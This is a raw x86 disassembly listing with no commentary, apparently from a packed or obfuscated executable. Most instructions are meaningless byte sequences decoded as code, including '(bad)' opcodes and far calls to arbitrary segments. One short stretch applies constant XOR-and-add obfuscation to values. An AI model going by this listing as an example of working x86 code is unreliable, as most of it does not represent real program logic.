  41039a:	add    BYTE PTR [ebx+0x34],0x36
  41039e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41039f:	int    0xbd
  4103a1:	cmp    eax,0x679224f8
  4103a6:	in     eax,dx
  4103a7:	jb     0x41036a
  4103a9:	scas   al,BYTE PTR es:[edi]
  4103aa:	pusha  
  4103ab:	and    eax,0xb6614262
  4103b1:	jmp    0x4a95:0x79ed8a8d
  4103b8:	out    0xf0,eax
  4103ba:	imul   ebp,DWORD PTR [ecx],0x71c04b02
  4103c0:	lds    edx,FWORD PTR [edi-0x40a1bca1]
  4103c6:	mov    esp,0x92985128
  4103cb:	lods   eax,DWORD PTR ds:[esi]
  4103cc:	popa   
  4103cd:	sub    ebx,edx
  4103cf:	jb     0x4103c2
  4103d1:	mov    eax,ds:0x8be63011
  4103d6:	ret    
  4103d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103d8:	inc    edi
  4103d9:	cmp    ah,ah
  4103db:	mov    esi,0xd63505b7
  4103e0:	sbb    al,0x2a
  4103e2:	popa   
  4103e3:	sub    bl,BYTE PTR [ebp+0x1ed85a5b]
  4103e9:	jo     0x41043f
  4103eb:	pop    ecx
  4103ec:	cli    
  4103ed:	mov    cl,0x6d
  4103ef:	sbb    BYTE PTR [edx+0x26],dl
  4103f2:	das    
  4103f3:	in     al,dx
  4103f4:	xor    edx,DWORD PTR [ecx]
  4103f6:	pop    esp
  4103f7:	stos   DWORD PTR es:[edi],eax
  4103f8:	ja     0x410428
  4103fa:	outs   dx,DWORD PTR ds:[esi]
  4103fb:	inc    edi
  4103fc:	fadd   DWORD PTR [esi]
  4103fe:	mov    al,0xe5
  410400:	wbinvd 
  410402:	push   eax
  410403:	loopne 0x41039c
  410405:	sbb    DWORD PTR [ecx-0x1e],eax
  410408:	mov    edi,0xd38257c8
  41040d:	int3   
  41040e:	add    BYTE PTR [edx-0x5b],dh
  410411:	and    eax,DWORD PTR [esp+eax*8+0x34]
  410415:	fistp  WORD PTR [ebx]
  410417:	std    
  410418:	call   0x3bec:0xb290bc05
  41041f:	pop    ds
  410420:	sbb    edi,edx
  410422:	adc    DWORD PTR [esi-0x38adc34e],eax
  410428:	imul   ecx,DWORD PTR [edi+0x23],0xd
  41042c:	(bad)  
  41042d:	int    0x8d
  41042f:	(bad)  
  410430:	stc    
  410431:	add    ecx,DWORD PTR [esi]
  410433:	mov    bl,0xd1
  410435:	dec    ebp
  410436:	mov    esp,0x75738d1e
  41043b:	loop   0x41048e
  41043d:	push   ss
  41043e:	mov    BYTE PTR [esi],dl
  410440:	lock xchg edx,eax
  410442:	pop    esp
  410443:	das    
  410444:	or     DWORD PTR [ebp+0x69ebb606],esp
  41044a:	sbb    bh,BYTE PTR [edx-0x2d]
  41044d:	sub    al,0x1a
  41044f:	nop
  410450:	fist   WORD PTR [edx+0x36b0a844]
  410456:	shl    BYTE PTR [eax],cl
  410458:	mov    ebp,0x5fe58d53
  41045d:	loope  0x41042f
  41045f:	or     al,0x7a
  410461:	push   0x2a
  410463:	addr16 adc eax,0x156bfbd7
  410469:	xlat   BYTE PTR ds:[ebx]
  41046a:	xchg   BYTE PTR [ebp-0x32],bl
  41046d:	mov    ecx,0x14aa0878
  410472:	jns    0x4104b0
  410474:	(bad)  
  410475:	mov    ds:0xe305d1f6,eax
  41047a:	test   eax,0x5a5ed52
  41047f:	into   
  410480:	push   esi
  410481:	jle    0x4104b7
  410483:	std    
  410484:	cmc    
  410485:	stc    
  410486:	mov    eax,ds:0x4e42cc0a
  41048b:	lods   eax,DWORD PTR ds:[esi]
  41048c:	jmp    0x410491
  41048e:	sub    DWORD PTR [ebx+0x56],ebx
  410491:	sub    bh,BYTE PTR [edx]
  410493:	pop    edi
  410494:	xlat   BYTE PTR ds:[ebx]
  410495:	adc    esp,DWORD PTR [ebp+0x58]
  410498:	push   edx
  410499:	sbb    al,0xca
  41049b:	(bad)  
  41049c:	mov    ds:0x9b70f99f,eax
  4104a1:	push   ecx
  4104a2:	mov    bh,BYTE PTR [esi+0x7d96db5c]
  4104a8:	ret    
  4104a9:	jbe    0x41045a
  4104ab:	jp     0x410469
  4104ad:	shl    eax,1
  4104af:	mov    edi,ds
  4104b1:	pop    es
  4104b2:	test   BYTE PTR [esi+0x3699aacc],bl
  4104b8:	ins    DWORD PTR es:[edi],dx
  4104b9:	add    ah,BYTE PTR [ebx-0x1d]
  4104bc:	test   al,0xde
  4104be:	jae    0x410478
  4104c0:	pop    edi
  4104c1:	std    
  4104c2:	pop    esp
  4104c3:	neg    BYTE PTR [edx+0x246ef8e6]
  4104c9:	in     eax,dx
  4104ca:	mov    eax,ds:0x75133244
  4104cf:	and    ch,BYTE PTR ds:[edx-0x483098eb]
  4104d6:	mov    bh,BYTE PTR [ebp+0x9]
  4104d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104da:	stos   DWORD PTR es:[edi],eax
  4104db:	and    al,0xf5
  4104dd:	cli    
  4104de:	sub    eax,DWORD PTR [ecx-0x4c98a10]
  4104e4:	mov    esp,0xe7ae4ec4
  4104e9:	aad    0xd4
  4104eb:	sbb    BYTE PTR [ecx-0x16],0xe6
  4104ef:	jo     0x410538
  4104f1:	and    edi,DWORD PTR [ebx+ebx*4]
  4104f4:	jecxz  0x41054f
  4104f6:	nop
  4104f7:	ss stos DWORD PTR es:[edi],eax
  4104f9:	push   ss
  4104fa:	and    al,0x3f
  4104fc:	jne    0x4104a0
  4104fe:	cwde   
  4104ff:	ja     0x4104d0
  410501:	(bad)  
  410503:	out    0x59,al
  410505:	mov    esp,0xf59e224a
  41050a:	cmp    BYTE PTR ds:0xb07f27fb,ah
  410510:	aam    0xd5
  410512:	test   al,0xc2
  410514:	ret    0x98fd
  410517:	nop
  410518:	clc    
  410519:	sub    ebp,edi
  41051b:	cli    
  41051c:	xchg   edx,eax
  41051d:	rol    DWORD PTR [eax-0x69],1
  410520:	jmp    FWORD PTR [ebx-0x59]
  410523:	in     eax,dx
  410524:	sub    eax,0xe81f722d
  410529:	inc    esi
  41052a:	pushf  
  41052b:	ds lock gs retf 0xda04
  410531:	xor    al,0xd8
  410533:	push   ecx
  410534:	mov    ecx,0x443e63a8
  410539:	popf   
  41053a:	pushf  
  41053b:	imul   edx
  41053d:	lock mov dh,0x69
  410540:	mov    esi,es
  410542:	sbb    BYTE PTR cs:[ebx+0x2a64956b],0x8f
  41054a:	cmp    eax,0x61d4c1e1
  41054f:	and    BYTE PTR [eax-0x4c],bl
  410552:	ret    
  410553:	jne    0x4105b4
  410555:	mov    al,ds:0x12e16a2c
  41055a:	mov    bl,0xe
  41055c:	stos   BYTE PTR es:[edi],al
  41055d:	mov    esi,0xfad1c87
  410562:	mov    edx,0xc1908d07
  410567:	inc    ebp
  410568:	mov    DWORD PTR [edx+0x75],ebx
  41056b:	mov    esp,0x840fc085
  410570:	mov    ss,WORD PTR [eax+eax*1]
  410573:	add    BYTE PTR [ecx-0x1016238b],cl
  410579:	add    eax,DWORD PTR [eax]
  41057b:	add    ch,ah
  41057d:	out    0x6f,al
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	test   DWORD PTR [edx+ebx*4+0x5a],esp
  41058c:	or     bh,BYTE PTR [edi+0x7d497070]
  410592:	jo     0x410604
  410594:	pusha  
  410595:	dec    edi
  410596:	(bad)  
  410597:	xor    eax,0xcbdcb682
  41059c:	loopne 0x4105ce
  41059e:	fiadd  DWORD PTR [edi+0x19b0f0e7]
  4105a4:	inc    esi
  4105a5:	jns    0x410566
  4105a7:	mov    ecx,0xd74be71b
  4105ac:	out    0xfa,eax
  4105ae:	sub    al,0xe6
  4105b0:	mov    ds:0xacb5a0fe,al
  4105b5:	es pop ebp
  4105b7:	pcmpeqd mm5,QWORD PTR [esi+esi*4-0x3f]
  4105bc:	pop    eax
  4105bd:	call   FWORD PTR [ebx]
  4105bf:	lea    edi,[ebx]
  4105c1:	jge    0x4105e3
  4105c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105c4:	inc    ebx
  4105c5:	xchg   ebx,eax
  4105c6:	sti    
  4105c7:	call   0x1353ecc7
  4105cc:	pop    edi
  4105cd:	or     ch,al
  4105cf:	out    0x58,al
  4105d1:	ror    BYTE PTR [edi],1
  4105d3:	sahf   
  4105d4:	and    BYTE PTR [edi],al
  4105d6:	sub    al,0xff
  4105d8:	les    ebp,FWORD PTR [ebx-0x6e7423ef]
  4105de:	cli    
  4105df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105e0:	mov    al,ds:0x3be6f4b1
  4105e5:	jmp    0x410653
  4105e7:	sti    
  4105e8:	mov    ch,0xa2
  4105ea:	mov    dl,0xe3
  4105ec:	call   0x9a72:0xd969953c
  4105f3:	adc    ch,cl
  4105f5:	in     al,0x90
  4105f7:	ins    BYTE PTR es:[edi],dx
  4105f8:	sub    DWORD PTR [ebx+0x77],esi
  4105fb:	iret   
  4105fc:	lahf   
  4105fd:	mov    edx,0x59af6955
  410602:	je     0x41067a
  410604:	loopne 0x410591
  410606:	mov    esp,0x53fcee36
  41060b:	ins    DWORD PTR es:[edi],dx
  41060c:	fidiv  WORD PTR [ebx-0x20d7f9f0]
  410612:	mov    ebx,cr6
  410615:	frstor ds:0xc035750d
  41061b:	add    eax,0x3e119b80
  410620:	jnp    0x410634
  410622:	add    eax,0xbcf2a2b6
  410627:	popa   
  410628:	push   eax
  410629:	mov    BYTE PTR [eax],cl
  41062b:	mov    esp,0x8e67436c
  410630:	ins    DWORD PTR es:[edi],dx
  410631:	and    al,0x36
  410633:	bound  edx,QWORD PTR [ecx]
  410635:	mov    ebp,0x485f28fb
  41063a:	popf   
  41063b:	push   DWORD PTR [ebx]
  41063d:	ins    BYTE PTR es:[edi],dx
  41063e:	js     0x41062a
  410640:	std    
  410641:	adc    al,0x67
  410643:	call   0xc4c0cbc
  410648:	cmp    dl,BYTE PTR [esi-0x5792a260]
  41064e:	out    dx,al
  41064f:	nop
  410650:	sub    ecx,eax
  410652:	mov    esp,ebx
  410654:	cmp    al,0x83
  410656:	loope  0x410632
  410658:	mov    dh,BYTE PTR ds:0xd2d85b79
  41065e:	push   esp
  41065f:	add    BYTE PTR [edi+0x231cdfb9],0xc8
  410666:	add    dl,cl
  410668:	mov    dh,BYTE PTR [ebp-0x5]
  41066b:	inc    esp
  41066c:	xor    esi,esi
  41066e:	lock (bad) 
  410670:	jecxz  0x410656
  410672:	in     eax,0xda
  410674:	dec    edi
  410675:	out    dx,eax
  410676:	es jge 0x410693
  410679:	(bad)  
  41067a:	fcomp  DWORD PTR [ebx-0x611a3acc]
  410680:	mov    bh,0x82
  410682:	xchg   dl,al
  410684:	xor    al,0x64
  410686:	jne    0x4106e5
  410688:	out    dx,eax
  410689:	mov    al,ds:0x9f78d622
  41068e:	mov    dh,0x7e
  410690:	dec    edi
  410691:	or     edx,eax
  410693:	and    bl,BYTE PTR ds:0x5e7abd30
  410699:	inc    edi
  41069a:	test   al,0x9f
  41069c:	push   es
  41069d:	cmp    ebp,ebp
  41069f:	sbb    al,0x36
  4106a1:	mov    ds:0xf0bd7c4f,al
  4106a6:	jnp    0x41065b
  4106a8:	fistp  WORD PTR [ecx+0x76]
  4106ab:	rcl    DWORD PTR [ebp+0x77],0x40
  4106af:	stos   DWORD PTR es:[edi],eax
  4106b0:	arpl   WORD PTR [edi],sp
  4106b2:	ins    BYTE PTR es:[edi],dx
  4106b3:	int3   
  4106b4:	fwait
  4106b5:	mov    dh,0x59
  4106b7:	dec    esp
  4106b8:	mov    ebx,0x2edbcb40
  4106bd:	pusha  
  4106be:	mov    dh,0x91
  4106c0:	and    edx,DWORD PTR [esi]
  4106c2:	inc    esp
  4106c3:	push   0xcfaaa1bf
  4106c8:	int    0xc3
  4106ca:	jl     0x410726
  4106cc:	int    0x29
  4106ce:	lods   eax,DWORD PTR ds:[si]
  4106d0:	push   edi
  4106d1:	enter  0x94a9,0xb6
  4106d5:	jo     0x4106ee
  4106d7:	push   cs
  4106d8:	lods   al,BYTE PTR ds:[esi]
  4106d9:	ins    BYTE PTR es:[edi],dx
  4106da:	fs fwait
  4106dc:	retf   0x9c6f
  4106df:	rcl    BYTE PTR [ebp+edx*2-0x2d],1
  4106e3:	sbb    dh,0x91
  4106e6:	xchg   eax,eax
  4106e8:	call   0x27eb:0x55274e6c
  4106ef:	rol    DWORD PTR [esi*2-0x3369b4b4],0xd5
  4106f7:	mov    al,0xd7
  4106f9:	test   al,0xc4
  4106fb:	fcmovbe st,st(3)
  4106fd:	xchg   DWORD PTR [esi-0x5efbed0],edx
  410703:	test   BYTE PTR [esi],cl
  410705:	mov    cl,ch
  410707:	mov    ds:0x502aab03,al
  41070c:	dec    ebp
  41070d:	jns    0x41075c
  41070f:	out    dx,al
  410710:	pop    ds
  410711:	mov    ah,0x11
  410713:	cmp    BYTE PTR [ebp-0x1d5f6d3b],bl
  410719:	push   ebp
  41071a:	inc    ebp
  41071b:	daa    
  41071c:	fisub  WORD PTR [ecx+0x47]
  41071f:	mov    ah,0x5b
  410721:	ret    0xa185
  410724:	or     DWORD PTR [ebp+0x6f],edi
  410727:	dec    edx
  410728:	or     DWORD PTR [esi-0x59],esp
  41072b:	ins    DWORD PTR es:[edi],dx
  41072c:	jmp    0x765bc0a7
  410731:	and    cl,BYTE PTR [edx+eax*2-0x9]
  410735:	pop    esp
  410736:	add    edi,edx
  410738:	and    edi,DWORD PTR [edx]
  41073a:	inc    ebx
  41073b:	jne    0x4106cd
  41073d:	jl     0x410748
  41073f:	mov    esp,0xa2eaa550
  410744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410745:	ret    
  410746:	stos   DWORD PTR es:[edi],eax
  410747:	and    al,BYTE PTR [edx]
  410749:	(bad)  
  41074c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41074d:	pop    eax
  41074e:	test   eax,0xe3074f59
  410753:	aas    
  410754:	jb     0x4107c1
  410756:	fs bswap esp
  410759:	es jl  0x4106ea
  41075c:	inc    ecx
  41075d:	scas   eax,DWORD PTR es:[edi]
  41075e:	dec    edi
  41075f:	push   edx
  410760:	xlat   BYTE PTR ds:[ebx]
  410761:	jno    0x410720
  410763:	test   edi,ebp
  410765:	call   0x2199:0xec99d65d
  41076c:	jge    0x4106ef
  41076e:	cmp    DWORD PTR [ebx+0x79a71b73],edx
  410774:	jp     0x410716
  410776:	xor    BYTE PTR ds:0xc51e465c,dh
  41077c:	ja     0x355a1365
  410782:	fsub   QWORD PTR [edi+0x46db732d]
  410788:	adc    al,0x54
  41078a:	adc    ebx,ebx
  41078c:	or     eax,0x4eb851a5
  410791:	hlt    
  410792:	mov    ?,WORD PTR [eax]
  410794:	cmp    al,0x30
  410796:	and    bh,0x49
  410799:	mov    esi,ecx
  41079b:	mov    ebp,0xdfe9f55c
  4107a0:	jmp    0x36c4a22b
  4107a5:	pop    ss
  4107a6:	pop    DWORD PTR [edx+0x16]
  4107a9:	push   ebx
  4107aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ab:	pop    ds
  4107ac:	xor    al,0x4a
  4107ae:	xor    esp,DWORD PTR [ecx+0x2b7c6964]
  4107b4:	ret    0xa8a1
  4107b7:	addr16 cmp al,0xb8
  4107ba:	jle    0x410769
  4107bc:	mov    bl,0xdc
  4107be:	inc    esi
  4107bf:	test   al,0xc7
  4107c1:	call   0xcee1:0xde24c545
  4107c8:	test   DWORD PTR [edi-0x6],eax
  4107cb:	lods   al,BYTE PTR ds:[esi]
  4107cc:	or     eax,0xeefe3c85
  4107d1:	fistp  WORD PTR [edx]
  4107d3:	aad    0xc2
  4107d5:	mov    esi,0xa1927ea2
  4107da:	push   edx
  4107db:	popf   
  4107dc:	(bad)  
  4107de:	ja     0x410859
  4107e0:	fs inc esi
  4107e2:	test   al,0xc5
  4107e4:	icebp  
  4107e5:	imul   BYTE PTR [ebp+0x102e56f5]
  4107eb:	cmp    ebx,ebp
  4107ed:	dec    ebp
  4107ee:	xor    BYTE PTR [esi+0x77],bl
  4107f1:	mov    fs,WORD PTR [ebp+esi*2-0x4ecc292d]
  4107f8:	or     DWORD PTR [edx+0x1d],ebp
  4107fb:	jmp    0xdaf8:0xf06d2d54
  410802:	les    esp,FWORD PTR [esi-0xb77bb23]
  410808:	ins    DWORD PTR es:[edi],dx
  410809:	(bad)  
  41080b:	arpl   WORD PTR [edx-0x4],bp
  41080e:	fcom   st(2)
  410810:	out    0xa3,eax
  410812:	mov    BYTE PTR [ebp-0x3a7db963],dh
  410818:	sbb    eax,0x895a7e02
  41081d:	and    bl,ch
  41081f:	xor    BYTE PTR [esi+ecx*8],cl
  410822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410823:	into   
  410824:	and    DWORD PTR [edx+0x1caa2f9e],eax
  41082a:	pop    ds
  41082b:	lods   eax,DWORD PTR ds:[esi]
  41082c:	(bad)  
  41082d:	jmp    0x4107c9
  41082f:	lods   al,BYTE PTR ds:[esi]
  410830:	ds aam 0x11
  410833:	jno    0x41086a
  410835:	and    edx,DWORD PTR [ecx+0x285d869d]
  41083b:	sbb    BYTE PTR [edx],bh
  41083d:	pop    esp
  41083e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41083f:	sub    dh,BYTE PTR ss:[ebx+edx*8+0x2de0c9d9]
  410847:	ins    BYTE PTR es:[edi],dx
  410848:	add    cl,BYTE PTR [ebx]
  41084a:	inc    eax
  41084b:	mov    ah,ch
  41084d:	cwde   
  41084e:	loop   0x41086d
  410850:	retf   0xbe28
  410853:	imul   edx,DWORD PTR [edx+0x5c],0x51
  410857:	and    ecx,DWORD PTR [ebx-0x42]
  41085a:	aaa    
  41085b:	test   BYTE PTR [edx-0x99d49c3],0x54
  410862:	clc    
  410863:	inc    esp
  410864:	sub    DWORD PTR [edx-0x77],esp
  410867:	mov    BYTE PTR [ebp+0x16],ah
  41086a:	mov    bh,0x1f
  41086c:	jge    0x4108e6
  41086e:	dec    edi
  41086f:	jnp    0x41085a
  410871:	gs repz mov esi,0xde8782e0
  410878:	es retf 0x600
  41087c:	out    0xa,eax
  41087e:	stos   DWORD PTR es:[edi],eax
  41087f:	test   al,0xc8
  410881:	nop
  410882:	loopne 0x410826
  410884:	xchg   ch,bl
  410886:	in     eax,dx
  410887:	lea    ecx,[edx]
  410889:	and    ah,ch
  41088b:	mov    cl,BYTE PTR [ecx+0x67]
  41088e:	fimul  WORD PTR [eax]
  410890:	fcmovb st,st(7)
  410892:	sbb    esi,DWORD PTR [edi+0x54]
  410895:	inc    ebx
  410896:	mov    gs,WORD PTR [edi]
  410898:	adc    al,0xf5
  41089a:	jmp    0x4108b9
  41089c:	aas    
  41089d:	adc    DWORD PTR [eax+0x364b18d2],esi
  4108a3:	jecxz  0x41083a
  4108a5:	add    bh,bl
  4108a7:	pop    esp
  4108a8:	shl    BYTE PTR [ecx],0x82
  4108ab:	popf   
  4108ac:	and    eax,DWORD PTR [ebp+0x70]
  4108af:	fwait
  4108b0:	adc    eax,0xfb30303
  4108b5:	and    BYTE PTR [ebx+0x42],cl
  4108b8:	nop
  4108b9:	xchg   edi,eax
  4108ba:	gs push ss
  4108bc:	mov    es,WORD PTR [edi+eax*1+0x289633aa]
  4108c3:	in     al,dx
  4108c4:	and    al,0x9f
  4108c6:	xor    eax,DWORD PTR [edi-0x30]
  4108c9:	ret    0xfe
  4108cc:	push   esi
  4108cd:	aam    0x78
  4108cf:	call   DWORD PTR [ebx+0x51372927]
  4108d5:	sub    cl,dl
  4108d7:	and    ah,BYTE PTR [edx+0x63]
  4108da:	xchg   esi,eax
  4108db:	xlat   BYTE PTR gs:[ebx]
  4108dd:	jp     0x410957
  4108df:	mov    dh,0x80
  4108e1:	push   edx
  4108e2:	stos   DWORD PTR es:[edi],eax
  4108e3:	stos   DWORD PTR es:[edi],eax
  4108e4:	das    
  4108e5:	pop    ecx
  4108e6:	cmp    eax,0x325e7820
  4108eb:	shl    BYTE PTR [ebx+0x3b4762f4],0x6
  4108f2:	add    DWORD PTR [ebx],ebx
  4108f4:	mov    BYTE PTR [esi+ebp*2-0x3d],dl
  4108f8:	hlt    
  4108f9:	adc    al,cl
  4108fb:	pop    esp
  4108fc:	stos   DWORD PTR es:[edi],eax
  4108fd:	in     eax,0xf0
  4108ff:	jb     0x41088e
  410901:	jl     0x41096f
  410903:	sub    BYTE PTR [edx+0x9c88e88],0x8
  41090a:	stos   BYTE PTR es:[edi],al
  41090b:	xchg   edi,eax
  41090c:	push   cs
  41090d:	dec    ebp
  41090e:	aad    0x43
  410910:	jl     0x41094e
  410912:	adc    eax,0xd18c07c4
  410917:	xor    ah,al
  410919:	mov    edx,0x3de275b6
  41091e:	stos   BYTE PTR es:[edi],al
  41091f:	sar    DWORD PTR [ebp+0x55d1b8d3],cl
  410925:	adc    esi,DWORD PTR [ebp+0x6d5cde37]
  41092b:	div    DWORD PTR [eax]
  41092d:	lock and DWORD PTR [eax+0x851bc4b],edx
  410934:	jge    0x4108dc
  410936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410937:	lea    eax,[ebp+0xd0f1628]
  41093d:	push   esi
  41093e:	jmp    0x4109b5
  410940:	or     al,0x68
  410942:	sub    DWORD PTR [ecx+0x4c897e6a],0xffffffe0
  410949:	cwde   
  41094a:	adc    al,0x5
  41094c:	(bad)  
  41094d:	mov    ah,0x2b
  41094f:	jecxz  0x41098a
  410951:	add    eax,0x5eda846f
  410956:	out    dx,eax
  410957:	das    
  410958:	aaa    
  410959:	(bad)  
  41095a:	std    
  41095b:	mov    ds:0xa6c35b66,eax
  410960:	aam    0x64
  410962:	xor    esp,DWORD PTR ds:0xfcc30a2b
  410968:	jge    0x41096e
  41096a:	int3   
  41096b:	push   0xb
  41096d:	pop    ecx
  41096e:	push   0x5
  410970:	dec    ecx
  410971:	pop    ebx
  410972:	xchg   ebx,ecx
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	nop
  410a05:	shl    DWORD PTR [edi+0x70bc638f],0x70
  410a0c:	dec    ecx
  410a0d:	jge    0x410a7f
  410a0f:	jo     0x4109dc
  410a11:	mov    ch,0xb3
  410a13:	inc    esi
  410a14:	and    ebp,DWORD PTR [ebx]
  410a16:	jecxz  0x410a55
  410a18:	jns    0x410a8f
  410a1a:	sbb    BYTE PTR [edx-0x60],bl
  410a1d:	mov    eax,ds:0xaf4233c1
  410a22:	rcl    BYTE PTR [ebp-0x6627578b],1
  410a28:	int3   
  410a29:	mov    eax,ds:0xbd400902
  410a2e:	ror    DWORD PTR [ebx+edi*1],0xc4
  410a32:	pushf  
  410a33:	mov    dh,0x84
  410a35:	pop    ebx
  410a36:	or     BYTE PTR [edx+0x55],dh
  410a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a3a:	lods   eax,DWORD PTR ds:[esi]
  410a3b:	js     0x410a51
  410a3d:	dec    esi
  410a3e:	jns    0x4109cf
  410a40:	and    al,0xcf
  410a42:	xor    ah,al
  410a44:	mov    esi,0x4f7f39e8
  410a49:	push   cs
  410a4a:	fwait
  410a4b:	rcr    BYTE PTR [ebp+0x58],0xcb
  410a4f:	mov    al,ds:0x53a2c143
  410a54:	pop    esp
  410a55:	mov    dl,0x4c
  410a57:	inc    ebp
  410a58:	add    al,0xe6
  410a5a:	fiadd  WORD PTR [esp+eax*4-0x6884d20c]
  410a61:	std    
  410a62:	pusha  
  410a63:	and    si,WORD PTR [edi+0x30]
  410a67:	jg     0x410a41
  410a69:	mov    esi,0x8e3d54cb
  410a6e:	pop    edi
  410a6f:	pushf  
  410a70:	fsubr  DWORD PTR [edx-0x7a]
  410a73:	add    BYTE PTR [ecx-0x78abf6d1],al
  410a79:	mov    ds:0x1b118099,al
  410a7e:	push   ds
  410a7f:	aam    0x39
  410a81:	and    edx,ecx
  410a83:	sub    BYTE PTR [eax+0x55],dl
  410a86:	add    edi,esi
  410a88:	push   0x5e5b91ef
  410a8d:	jge    0x410b02
  410a8f:	into   
  410a90:	scas   eax,DWORD PTR es:[edi]
  410a91:	and    BYTE PTR [ebp+0x14aa6ad1],cl
  410a97:	call   DWORD PTR [edx+0x3f]
  410a9a:	xchg   ebx,eax
  410a9b:	pop    eax
  410a9c:	mov    ds:0xffe0fd16,al
  410aa1:	jmp    DWORD PTR [edi]
  410aa3:	fstp   TBYTE PTR [ecx]
  410aa5:	fistp  QWORD PTR [edx]
  410aa7:	aam    0xed
  410aa9:	mov    dl,0xb7
  410aab:	and    bh,bh
  410aad:	inc    edx
  410aae:	arpl   WORD PTR [eax],cx
  410ab0:	stos   BYTE PTR es:[edi],al
  410ab1:	mov    al,ds:0xadfa4560
  410ab6:	or     ebx,DWORD PTR [edx-0x5d293115]
  410abc:	pop    esp
  410abd:	mov    cl,ah
  410abf:	mov    ch,cl
  410ac1:	es xor eax,0x10f864b
  410ac7:	pop    ds
  410ac8:	fbld   TBYTE PTR [ebp+eax*8-0x32fc514c]
  410acf:	out    0x64,al
  410ad1:	mov    ebx,0xd5e52766
  410ad6:	outs   dx,DWORD PTR ds:[esi]
  410ad7:	retf   0xfc02
  410ada:	inc    esi
  410adb:	jp     0x410ae3
  410add:	imul   ebx,DWORD PTR [edx-0xd51a4c1],0xaf26640f
  410ae7:	call   0xf640:0x5c17541d
  410aee:	leave  
  410aef:	mov    ss,WORD PTR [eax+0x5dfd267b]
  410af5:	sub    cl,BYTE PTR [ecx+edx*2]
  410af8:	sbb    DWORD PTR [esi],edx
  410afa:	stc    
  410afb:	sub    BYTE PTR [edi-0xe2b4309],dl
  410b01:	push   ss
  410b02:	xlat   BYTE PTR ds:[ebx]
  410b03:	push   0xffffffcc
  410b05:	cmp    DWORD PTR [ebp+ebx*4+0x70],0xffffffe0
  410b0a:	mov    dh,0x6a
  410b0c:	in     al,dx
  410b0d:	mov    DWORD PTR [edi],esi
  410b0f:	push   cs
  410b10:	fisttp QWORD PTR [eax-0x17120bad]
  410b16:	aam    0xff
  410b18:	jns    0x410aff
  410b1a:	jb     0x410b26
  410b1c:	dec    edi
  410b1d:	cmp    edi,eax
  410b1f:	(bad)
  410b23:	cmp    ebx,ebx
  410b25:	mov    eax,0xfd2a955d
  410b2a:	nop
  410b2b:	out    0x72,eax
  410b2d:	jp     0x410b52
  410b2f:	jne    0x410b80
  410b31:	dec    eax
  410b32:	mov    WORD PTR [esp+edi*1+0x3],ds
  410b36:	pop    edx
  410b37:	xor    BYTE PTR [edx],al
  410b39:	sub    eax,0x784802be
  410b3e:	call   0x894d:0x38a7d970
  410b45:	adc    BYTE PTR [ecx],al
  410b47:	test   DWORD PTR [ebp+0x7c],ecx
  410b4a:	mov    edx,0x837ee254
  410b4f:	push   eax
  410b50:	add    al,cl
  410b52:	test   eax,0xf49b514a
  410b57:	in     al,dx
  410b58:	add    eax,0xb672e59
  410b5d:	rcr    DWORD PTR [esp+eax*2+0x6cae5292],0xc5
  410b65:	dec    eax
  410b66:	daa    
  410b67:	push   0x9f96030d
  410b6c:	mov    DWORD PTR [eax+0x20],esp
  410b6f:	sar    DWORD PTR [ecx+ecx*4+0x0],cl
  410b73:	iret   
  410b74:	cmp    BYTE PTR [edi-0x16],al
  410b77:	mov    bl,0x1
  410b79:	cld    
  410b7a:	into   
  410b7b:	sub    BYTE PTR es:[ecx+0x3a],0x91
  410b80:	ret    0x5508
  410b83:	pop    ecx
  410b84:	fild   QWORD PTR [ecx-0x1fa8b8eb]
  410b8a:	pop    edx
  410b8b:	scas   eax,DWORD PTR es:[edi]
  410b8c:	pop    ecx
